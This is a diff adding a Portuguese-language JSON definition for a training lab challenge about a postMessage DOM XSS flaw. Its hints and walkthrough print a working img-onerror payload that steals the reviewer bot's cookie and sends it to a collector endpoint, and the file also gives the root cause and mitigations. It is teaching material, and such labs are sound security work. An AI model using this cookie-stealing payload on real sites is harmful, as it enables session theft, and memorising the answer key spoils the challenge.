@@ -1,0 +1,80 @@
+{
+  "slug": "client-postmessage",
+  "title": "Confiança em mensagens",
+  "codename": "MESSAGE PIER",
+  "summary": "O receiver do Message Pier valida a origem do postMessage, mas injeta o corpo da mensagem como HTML. Um sender da mesma origem consegue entregar um payload ao receiver privilegiado e exfiltrar seu cookie.",
+  "category": "client",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "client-postmessage",
+  "estimated_minutes": 26,
+  "xp": 170,
+  "tech": [
+    "JavaScript",
+    "postMessage",
+    "Selenium bot"
+  ],
+  "tags": [
+    "postmessage",
+    "dom-xss",
+    "client-side"
+  ],
+  "story": "O widget de preview do pier separa sender e receiver. O receiver verifica `event.origin`, então a equipe o marcou como seguro. Em seguida, ele atribui `event.data.html` a `innerHTML`, tornando a confiança na origem irrelevante para o conteúdo que executa.",
+  "objective": "Crie uma URL de sender cujo payload de preview executa no receiver e exfiltra o cookie do revisor para `/collect`.",
+  "rules": "O bot abre apenas caminhos locais deste lab. Não envie mensagens para origens externas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Cookie do revisor",
+      "flag_type": "user",
+      "points": 170,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Leia as duas janelas",
+      "body": "`/victim` aceita mensagens do tipo `preview` da mesma origem e escreve `event.data.html` em `innerHTML`. `/exploit` envia o valor da query `x` para o receiver.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "Escolha um payload HTML executável",
+      "body": "`<script>` inserido com innerHTML não executa, mas um handler de erro de imagem executa: `<img src=x onerror=\"fetch('/collect?c='+encodeURIComponent(document.cookie))\">`.",
+      "cost": 25
+    },
+    {
+      "level": 3,
+      "title": "Entregue o payload",
+      "body": "Faça URL-encode do payload no valor de `/exploit?x=...` e envie esse caminho em `/report`. Leia `/captured`; o cookie `review_session` é a flag.",
+      "cost": 30
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Abra `/victim` e inspecione o listener. Ele verifica a origem e depois usa `innerHTML`.\n2. Monte o payload:\n```html\n<img src=x onerror=\"fetch('/collect?c='+encodeURIComponent(document.cookie))\">\n```\n3. Faça URL-encode dele como valor de `x` em `/exploit?x=...`.\n4. Envie o caminho para `/report`, depois abra `/captured` e envie o cookie do revisor.",
+    "root_cause": "Tratamento inseguro de postMessage. Validar a origem do sender é necessário, mas não suficiente: o receiver trata os dados da mensagem como HTML confiável e os escreve em um sink de DOM XSS. Qualquer página na origem confiável pode enviar HTML arbitrário.",
+    "mitigation": "Trate dados de postMessage como input não confiável: use um schema estrito, faça allowlist dos tipos de mensagem, renderize como texto em vez de HTML, sanitize com uma biblioteca confiável, valide `event.source` quando adequado e isole conteúdo privilegiado do conteúdo de usuário da mesma origem."
+  },
+  "references": [
+    {
+      "title": "MDN — Window.postMessage",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage",
+      "source_type": "standard",
+      "description": "Semântica de origem e orientações para mensagens seguras."
+    },
+    {
+      "title": "PortSwigger — DOM-based XSS",
+      "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+      "source_type": "official",
+      "description": "DOM sinks e ataques client-side movidos por mensagens."
+    },
+    {
+      "title": "OWASP — DOM XSS Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Sinks seguros e como evitar innerHTML com dados não confiáveis."
+    }
+  ]
+}
